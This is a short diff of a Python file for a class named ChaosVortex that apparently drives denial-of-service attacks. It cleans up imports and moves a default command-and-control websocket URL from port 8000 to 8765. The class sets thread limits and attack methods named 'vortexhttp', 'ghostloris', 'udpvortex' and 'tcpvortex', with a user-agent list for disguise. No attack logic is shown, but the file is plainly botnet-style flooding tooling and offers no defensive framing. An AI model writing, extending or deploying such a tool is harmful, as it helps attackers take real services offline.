@@ -6,18 +6,16 @@ import random
 import string
 import time
 import argparse
-import logging import logger
+import logging
 import os
 import base64
+import json
 import websocket
 import zlib
-import time
-import argparse
 from typing import List, Dict
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization, hashes
-from typing import List, Dict
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.hmac import HMAC
 from cryptography.hazmat.backends import default_backend
@@ -38,7 +36,7 @@ class ChaosVortex:
         self.threads = max(1, min(threads, 30))  # Limit to avoid Replit overload
         self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
         self.end_time = time.time() + duration
-        self.c2_url = c2_url or "ws://127.0.0.1:8000"  # Use localhost explicitly
+        self.c2_url = c2_url or "ws://127.0.0.1:8765"  # Use localhost explicitly
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
